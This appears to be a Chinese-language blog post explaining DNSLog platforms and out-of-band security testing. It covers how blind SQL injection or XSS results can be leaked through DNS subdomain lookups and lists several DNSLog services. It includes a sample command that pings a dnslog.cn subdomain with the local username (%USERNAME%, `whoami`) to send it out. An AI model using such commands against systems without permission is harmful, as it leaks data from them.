---
title: DNSlog平台
categories: tools
img: /images/DNSlog.jpg
tags:
  - OAST
  - DNS
abbrlink: 8726
date: 2024-08-31 12:32:22
---
## dnslog解释

DNS:域名解析IP,用户在浏览器输入一个域名,靠DNS服务解析域名的真实IP,访问服务器上相应的服

DNSLOG: DNS的日志,存储在DNS 服务器上的域名信息,记录着用户对域名的访问信息,类似日志文件

**什么是无回显**
在我们日常去做漏洞探测的时候，我们发送的payload，比如SQL注入，XSS注入的一个payload，发送到了服务器之后，服务器执行了我们的语句或者代码，服务器会返回给我们一个HTTP的响应。
这个返回的响应里面就包含了我们想要的结果。比如，我们在执行SQL注入语句时，返回界面会给我们爆出一些信息来让我们判断是否有SQL注入漏洞

## 什么是DNSLog

DNSLog是一个DNS请求记录平台，可以记录和分析DNS请求的详细信息，包括请求来源、目标域名、请求时间和响应状态等

查询时间：DNS查询的时间戳。
客户端IP地址：发出DNS查询请求的客户端的IP地址。
域名：查询的域名。
DNS类型：查询使用的DNS记录类型，如A、MX、CNAME、NS等。
DNS服务器IP地址：用于解析DNS记录的DNS服务器的IP地址。
响应结果：DNS查询的响应结果，包括对应的IP地址、CNAME记录等信息。
DNS查询是否成功：记录DNS查询成功或失败的状态。

**DNSLog解决无回显**
比如我们的浏览器向存在漏洞的网站发送了一个请求，这个请求包含了SQL注入的语句的同时又包含了对DNSLog服务器的请求，那么存在漏洞的网站便会将这个SQL注入语句执行了，然后它会将响应的结果拼接在DNSlog的子域名里面，通过DNSLog平台将结果回显给我们。

------------------------------------------------

## 什么是 OAST 测试？

带外应用程序安全测试 （OAST） 使用外部服务器来查看原本不可见的漏洞。引入它是为了进一步改进 [DAST](https://portswigger.net/burp/application-security-testing/dast)（[动态应用程序安全测试](https://portswigger.net/burp/application-security-testing/dast)）模型。PortSwigger 是 Burp Collaborator 的 OAST 先驱。这为 Burp Suite 增加了 OAST 功能，使该方法更易于访问。

SAST（静态应用程序安全测试）是另一种常见的安全测试方法。它实际上采用了与动态测试相反的方法。DAST 将应用程序视为攻击者 - 从外到内 - SAST 会查看代码本身。这种方法赋予了它一组不同的优点和缺点

OAST可让您检测不可见的漏洞。这些漏洞不会：

- 触发错误消息。
- 导致应用程序输出出现差异。
- 导致可检测的时间延迟

带外应用程序安全测试 使用自己的服务器来识别不可见的漏洞，一般流程如下：

- Burp 在请求中将 Collaborator 负载发送到目标应用程序。这些是协作者服务器域的子域。当出现某些漏洞时，目标应用程序可能会使用注入的有效负载与 Collaborator 服务器进行交互。
- Burp 轮询服务器，以查看是否发生了交互。

## 几个好用的dnslog在线平台

1、http://www.dnslog.cn/

{% asset_img DNSlog平台.jpg DNSlog平台 %}

windows的cmd中：
%USERNAME% //是获取本地计算机用户名
3yycqi.dnslog.cn //随机生成是固定的
ping %USERNAME% 3yycqi.dnslog.cn
liunx/mac中：
`whoami`	//是获取本地计算机用户名


2、https://dig.pm/

{% asset_img dig平台.jpg dig平台 %}

3、http://ceye.io/profile
这个平台得去注册个用户登录才能使用

4、http://eyes.sh/dns/
自己注册一个账号

## 好用的图床
在GitHub上获取Token的方法是登录GitHub账号，进入“Settings”->“Developer settings”->“Personal access tokens”，选中经典模式，添加相应权限，点击“Generate a personal access token”并设定权限后生成Token。
默认创建仓库名：picx-images-hosting
上传pc端：
https://picx.xpoet.cn/#/config